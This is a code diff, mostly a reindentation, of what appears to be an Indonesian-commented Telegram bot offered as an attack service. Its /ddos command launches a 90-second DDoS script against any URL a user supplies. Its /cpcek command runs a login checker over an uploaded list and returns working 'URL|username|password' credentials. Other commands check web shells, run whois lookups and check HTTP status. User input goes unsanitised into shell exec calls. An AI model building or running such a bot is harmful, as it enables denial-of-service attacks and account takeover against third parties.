@@ -205,75 +205,75 @@ bot.onText(/\/cpcek/, (msg) => {
 
                 const intervalId = setInterval(() => {
                     sendProgressUpdate(chatId, messageId, progress);
-                    progress += 10; // Increment progress by 10%
-                }, 5000); // Check progress every 5 seconds
+                progress += 10; // Increment progress by 10%
+            }, 5000); // Check progress every 5 seconds
 
-                exec(`python3 cp.py ${filePath} 10`, (error, stdout, stderr) => {
-                    clearInterval(intervalId); // Stop checking progress
-                    if (error) {
-                        bot.sendMessage(chatId, `Error: ${error.message}`);
-                        console.error(`Error: ${error.message}`);
-                        return;
-                    }
-                    if (stderr) {
-                        bot.sendMessage(chatId, `Stderr: ${stderr}`);
-                        console.error(`Stderr: ${stderr}`);
-                        return;
-                    }
+            exec(`python3 cp.py ${filePath} 10`, (error, stdout, stderr) => {
+                clearInterval(intervalId); // Stop checking progress
+                if (error) {
+                    bot.sendMessage(chatId, `Error: ${error.message}`);
+                    console.error(`Error: ${error.message}`);
+                    return;
+                }
+                if (stderr) {
+                    bot.sendMessage(chatId, `Stderr: ${stderr}`);
+                    console.error(`Stderr: ${stderr}`);
+                    return;
+                }
 
-                    console.log(`Stdout: ${stdout}`);
-                    bot.sendMessage(chatId, stdout); // Sending stdout to the user for debugging
+                console.log(`Stdout: ${stdout}`);
+                bot.sendMessage(chatId, stdout); // Sending stdout to the user for debugging
 
-                    const goodFilePath = './good.txt';
-                    if (fs.existsSync(goodFilePath)) {
-                        bot.sendDocument(chatId, goodFilePath, { caption: 'Successful logins: URL|username|password' }).then(() => {
-                            fs.unlinkSync(goodFilePath);
-                        });
-                    } else {
-                        bot.sendMessage(chatId, 'No successful logins found.');
-                    }
-                });
+                const goodFilePath = './good.txt';
+                if (fs.existsSync(goodFilePath)) {
+                    bot.sendDocument(chatId, goodFilePath, { caption: 'Successful logins: URL|username|password' }).then(() => {
+                        fs.unlinkSync(goodFilePath);
+                    });
+                } else {
+                    bot.sendMessage(chatId, 'No successful logins found.');
+                }
             });
         });
-
-        writeStream.on('error', (error) => {
-            bot.sendMessage(chatId, `Failed to write file: ${error.message}`);
-            console.error(`Failed to write file: ${error.message}`);
-        });
     });
+
+    writeStream.on('error', (error) => {
+        bot.sendMessage(chatId, `Failed to write file: ${error.message}`);
+        console.error(`Failed to write file: ${error.message}`);
+    });
+});
 });
 
 // Handler untuk command /ddos
 bot.onText(/\/ddos (.+)/, (msg, match) => {
-    const chatId = msg.chat.id;
-    const url = match[1];
-    const duration = 90; // Default duration, you can change this as needed
+const chatId = msg.chat.id;
+const url = match[1];
+const duration = 90; // Default duration, you can change this as needed
 
-    if (isDDOSRunning) {
-        bot.sendMessage(chatId, 'Sorry, another DDOS attack is already in progress. Please wait until it finishes.');
-        return;
-    }
+if (isDDOSRunning) {
+bot.sendMessage(chatId, 'Sorry, another DDOS attack is already in progress. Please wait until it finishes.');
+return;
+}
 
-    isDDOSRunning = true;
+isDDOSRunning = true;
 
-    bot.sendMessage(chatId, `Starting DDOS attack to ${url} for ${duration} seconds...`);
+bot.sendMessage(chatId, `Starting DDOS attack to ${url} for ${duration} seconds...`);
 
-    exec(`python3 ddos.py ${url} ${duration}`, (error, stdout, stderr) => {
-        isDDOSRunning = false; // Reset the flag after attack is finished
-        if (error) {
-            bot.sendMessage(chatId, `Error: ${error.message}`);
-            console.error(`Error: ${error.message}`);
-            return;
-        }
-        if (stderr) {
-            bot.sendMessage(chatId, `Stderr: ${stderr}`);
-            console.error(`Stderr: ${stderr}`);
-            return;
-        }
+exec(`python3 ddos.py ${url} ${duration}`, (error, stdout, stderr) => {
+isDDOSRunning = false; // Reset the flag after attack is finished
+if (error) {
+bot.sendMessage(chatId, `Error: ${error.message}`);
+console.error(`Error: ${error.message}`);
+return;
+}
+if (stderr) {
+bot.sendMessage(chatId, `Stderr: ${stderr}`);
+console.error(`Stderr: ${stderr}`);
+return;
+}
 
-        console.log(`Stdout: ${stdout}`);
-        bot.sendMessage(chatId, stdout); // Sending stdout to the user for debugging
-    });
+console.log(`Stdout: ${stdout}`);
+bot.sendMessage(chatId, stdout); // Sending stdout to the user for debugging
+});
 });
 
 // Handler untuk command /shellcek
@@ -338,12 +338,26 @@ bot.onText(/\/shellcek/, (msg) => {
 
 // Handler untuk command /whois
 bot.onText(/\/whois (.+)/, (msg, match) => {
-    const chatId = msg.chat.id;
-    const ipAddress = match[1];
+const chatId = msg.chat.id;
+const ipAddress = match[1];
 
-    getWhoisInfo(ipAddress, (result) => {
-        bot.sendMessage(chatId, result);
-    });
+getWhoisInfo(ipAddress, (result) => {
+bot.sendMessage(chatId, result);
+});
+});
+
+// Handler untuk command /http
+bot.onText(/\/http (.+)/, (msg, match) => {
+const chatId = msg.chat.id;
+const url = match[1];
+
+bot.sendMessage(chatId, `Checking HTTP status for ${url}...`, {
+reply_markup: {
+inline_keyboard: [
+[{ text: 'Check', url: `https://check-host.net/check-http?host=${encodeURIComponent(url)}` }]
+]
+}
+});
 });
 
 bot.on('polling_error', (error) => console.log(`Polling Error: ${error.message}`));
